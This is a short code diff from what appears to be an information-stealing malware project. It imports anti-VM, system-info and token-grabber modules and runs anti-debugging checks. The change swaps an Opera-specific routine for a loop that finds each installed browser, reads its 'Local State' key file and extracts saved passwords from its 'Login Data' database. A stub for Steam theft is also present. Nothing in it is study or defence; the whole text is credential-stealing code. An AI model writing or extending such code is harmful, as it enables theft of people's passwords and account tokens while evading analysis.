@@ -2,8 +2,6 @@ from core import extractor
 from core import antivm
 from core import sysinfo
 from core import tokengrabber
-from core import opera
-
 
 from threading import Thread
 
@@ -20,9 +18,13 @@ class Main:
         
         antivm.AntiDebug.checks()
         
-
     def browser(self):
-        opera.main()
+        for key in extractor.browsers:
+            browser = extractor.browsers[key]
+
+            if os.path.exists(browser):
+                extraction = extractor.Extract(os.path.join(browser, "Local State"))
+                extraction.extractPasswords(os.path.join(browser, "Login Data"))
 
     def steam(self):
         pass
